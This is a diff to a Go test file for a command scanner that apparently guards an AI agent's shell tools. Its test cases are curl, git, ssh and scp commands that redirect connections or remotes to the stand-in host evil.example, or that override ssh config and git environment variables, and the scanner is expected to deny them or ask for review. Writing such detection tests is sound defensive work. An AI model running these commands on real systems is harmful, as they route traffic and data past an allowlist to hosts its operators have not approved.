@@ -368,56 +368,176 @@ func TestScannerAdditionalBranches(t *testing.T) {
 
 func TestCurlConnectionOverrideHostsCheckedAgainstAllowlist(t *testing.T) {
 	p := DefaultPolicy()
-	p.AllowedCommands = []string{"curl"}
-	p.AllowedDomains = []string{"allowed.example"}
+	p.AllowedDomains = []string{"github.com"}
 	scanner := NewScanner(p)
 
 	tests := []struct {
+		name     string
 		command  string
+		decision Decision
 		evidence string
 	}{
 		{
-			command: "curl --connect-to allowed.example:443:evil.example:443 " +
-				"https://allowed.example/path",
+			name:     "connect-to space separated",
+			command:  "curl --connect-to github.com:443:evil.example:443 https://github.com/trpc-group/trpc-agent-go",
+			decision: DecisionDeny,
 			evidence: "evil.example",
 		},
 		{
-			command: "curl --connect-to=allowed.example:443:evil.example:443 " +
-				"https://allowed.example/path",
+			name:     "connect-to equals",
+			command:  "curl --connect-to=github.com:443:evil.example:443 https://github.com/trpc-group/trpc-agent-go",
+			decision: DecisionDeny,
 			evidence: "evil.example",
 		},
 		{
-			command: "curl --resolve allowed.example:443:203.0.113.10 " +
-				"https://allowed.example/path",
+			name:     "resolve ip override",
+			command:  "curl --resolve github.com:443:203.0.113.10 https://github.com/trpc-group/trpc-agent-go",
+			decision: DecisionDeny,
 			evidence: "203.0.113.10",
 		},
 		{
-			command: "curl --resolve=+allowed.example:443:203.0.113.10 " +
-				"https://allowed.example/path",
-			evidence: "203.0.113.10",
+			name:     "allowlisted override",
+			command:  "curl --connect-to github.com:443:github.com:443 https://github.com/trpc-group/trpc-agent-go",
+			decision: DecisionAllow,
 		},
 	}
 	for _, tc := range tests {
-		t.Run(tc.command, func(t *testing.T) {
+		t.Run(tc.name, func(t *testing.T) {
 			report := scanner.Scan(context.Background(), Request{
 				ToolName: "workspace_exec",
 				Backend:  BackendWorkspaceExec,
 				Command:  tc.command,
 			})
-			require.Equal(t, DecisionDeny, report.Decision, report.Findings)
-			require.True(t, hasRule(report, ruleNetworkEgress), report.Findings)
-			require.True(t, hasFindingEvidence(report, ruleNetworkEgress, tc.evidence), report.Findings)
+			require.Equal(t, tc.decision, report.Decision, report.Findings)
+			if tc.evidence != "" {
+				require.True(t, hasFindingEvidence(report, ruleNetworkEgress, tc.evidence), report.Findings)
+			}
 		})
 	}
+}
 
-	report := scanner.Scan(context.Background(), Request{
-		ToolName: "workspace_exec",
-		Backend:  BackendWorkspaceExec,
-		Command: "curl --connect-to allowed.example:443:mirror.allowed.example:443 " +
-			"https://allowed.example/path",
-	})
-	require.Equal(t, DecisionAllow, report.Decision, report.Findings)
-	require.False(t, hasRule(report, ruleNetworkEgress), report.Findings)
+func TestGitNetworkRemotesCheckedAgainstAllowlist(t *testing.T) {
+	p := DefaultPolicy()
+	p.AllowedCommands = []string{"git"}
+	p.DeniedCommands = []string{}
+	p.AllowedDomains = []string{"github.com"}
+	scanner := NewScanner(p)
+
+	tests := []struct {
+		name     string
+		command  string
+		decision Decision
+		evidence string
+	}{
+		{
+			name:     "scp-like remote",
+			command:  "git clone git@evil.example:repo.git",
+			decision: DecisionDeny,
+			evidence: "evil.example",
+		},
+		{
+			name:     "ssh url remote",
+			command:  "git clone ssh://evil.example/repo.git",
+			decision: DecisionDeny,
+			evidence: "evil.example",
+		},
+		{
+			name:     "git protocol remote",
+			command:  "git ls-remote git://evil.example/repo.git",
+			decision: DecisionDeny,
+			evidence: "evil.example",
+		},
+		{
+			name:     "configured remote",
+			command:  "git fetch origin",
+			decision: DecisionAsk,
+			evidence: "git fetch origin",
+		},
+		{
+			name:     "allowlisted remote",
+			command:  "git clone https://github.com/trpc-group/trpc-agent-go",
+			decision: DecisionAllow,
+		},
+		{
+			name:     "insteadOf rewrite host",
+			command:  "git -c url.ssh://evil.example/.insteadOf=https://github.com/ clone https://github.com/trpc-group/trpc-agent-go",
+			decision: DecisionDeny,
+			evidence: "evil.example",
+		},
+		{
+			name:     "core ssh command needs review",
+			command:  "git -c core.sshCommand='ssh -F /tmp/ssh_config' clone https://github.com/trpc-group/trpc-agent-go",
+			decision: DecisionAsk,
+			evidence: "core.sshCommand",
+		},
+		{
+			name:     "allowlisted rewrite host",
+			command:  "git -c url.ssh://github.com/.insteadOf=https://github.com/ clone https://github.com/trpc-group/trpc-agent-go",
+			decision: DecisionAllow,
+		},
+		{
+			name:     "remote set-url push option",
+			command:  "git remote set-url --push origin ssh://evil.example/repo.git",
+			decision: DecisionDeny,
+			evidence: "evil.example",
+		},
+		{
+			name:     "global worktree option before clone",
+			command:  "git -C /tmp/work clone ssh://evil.example/repo.git",
+			decision: DecisionDeny,
+			evidence: "evil.example",
+		},
+		{
+			name:     "upload-pack option before remote",
+			command:  "git ls-remote --upload-pack=/tmp/git-upload-pack ssh://evil.example/repo.git",
+			decision: DecisionDeny,
+			evidence: "evil.example",
+		},
+		{
+			name:     "config-env network option needs review",
+			command:  "git --config-env=core.sshCommand=GIT_SSH_COMMAND clone https://github.com/trpc-group/trpc-agent-go",
+			decision: DecisionAsk,
+			evidence: "git --config-env core.sshCommand",
+		},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			report := scanner.Scan(context.Background(), Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  tc.command,
+			})
+			require.Equal(t, tc.decision, report.Decision, report.Findings)
+			if tc.evidence != "" {
+				require.True(t, hasFindingEvidence(report, ruleNetworkEgress, tc.evidence), report.Findings)
+			}
+		})
+	}
+}
+
+func TestHomeEnvironmentIsDeniedByDefault(t *testing.T) {
+	p := DefaultPolicy()
+	require.NotContains(t, p.EnvAllowlist, "HOME")
+
+	tests := map[string]string{
+		"HOME":              "/tmp/untrusted-home",
+		"GIT_SSH_COMMAND":   "ssh -F /tmp/ssh_config",
+		"GIT_CONFIG_GLOBAL": "/tmp/gitconfig",
+		"GIT_CONFIG_SYSTEM": "/tmp/gitconfig",
+		"SSH_AUTH_SOCK":     "/tmp/agent.sock",
+	}
+	for key, value := range tests {
+		t.Run(key, func(t *testing.T) {
+			report := NewScanner(p).Scan(context.Background(), Request{
+				ToolName: toolExecCommand,
+				Backend:  BackendHostExec,
+				Command:  "echo ok",
+				Env:      map[string]string{key: value},
+			})
+			require.Equal(t, DecisionDeny, report.Decision, report.Findings)
+			require.True(t, hasFindingEvidence(report, ruleEnvironment, key), report.Findings)
+		})
+	}
 }
 
 func TestSSHLikeHostsFindRemoteTargets(t *testing.T) {
@@ -487,7 +607,7 @@ func TestSSHLikeHostsFindRemoteTargets(t *testing.T) {
 
 func TestSSHLikeOptionHostsCheckedAgainstAllowlist(t *testing.T) {
 	p := DefaultPolicy()
-	p.AllowedCommands = append(p.AllowedCommands, "ssh", "scp", "sftp")
+	p.AllowedCommands = append(p.AllowedCommands, "ssh", "scp")
 	p.DeniedCommands = []string{}
 	p.AllowedDomains = []string{"allowed.example"}
 	scanner := NewScanner(p)
@@ -558,23 +678,26 @@ func TestSSHLikeUnsafeOptionsNeedReview(t *testing.T) {
 	p.AllowedDomains = []string{"allowed.example"}
 	scanner := NewScanner(p)
 
-	tests := []string{
-		"ssh -F /tmp/ssh_config allowed.example",
-		"ssh -F/tmp/ssh_config allowed.example",
-		"ssh -o Include=/tmp/ssh_config allowed.example",
-		`ssh -o "Include /tmp/ssh_config" allowed.example`,
-		"scp -S /tmp/proxy ./x allowed.example:/tmp/x",
-		"sftp -S/tmp/proxy allowed.example",
+	tests := []struct {
+		command  string
+		evidence string
+	}{
+		{command: "ssh -F /tmp/ssh_config allowed.example", evidence: "ssh -F /tmp/ssh_config"},
+		{command: "ssh -F/tmp/ssh_config allowed.example", evidence: "ssh -F /tmp/ssh_config"},
+		{command: "ssh -o Include=/tmp/ssh_config allowed.example", evidence: "ssh -o Include=/tmp/ssh_config"},
+		{command: `ssh -o "Include /tmp/ssh_config" allowed.example`, evidence: "ssh -o Include /tmp/ssh_config"},
+		{command: "scp -S /tmp/proxy ./x allowed.example:/tmp/x", evidence: "scp -S /tmp/proxy"},
+		{command: "sftp -S/tmp/proxy allowed.example", evidence: "sftp -S /tmp/proxy"},
 	}
-	for _, command := range tests {
-		t.Run(command, func(t *testing.T) {
+	for _, tc := range tests {
+		t.Run(tc.command, func(t *testing.T) {
 			report := scanner.Scan(context.Background(), Request{
 				ToolName: "workspace_exec",
 				Backend:  BackendWorkspaceExec,
-				Command:  command,
+				Command:  tc.command,
 			})
 			require.Equal(t, DecisionAsk, report.Decision, report.Findings)
-			require.True(t, hasRule(report, ruleNetworkEgress), report.Findings)
+			require.True(t, hasFindingEvidence(report, ruleNetworkEgress, tc.evidence), report.Findings)
 		})
 	}
 }
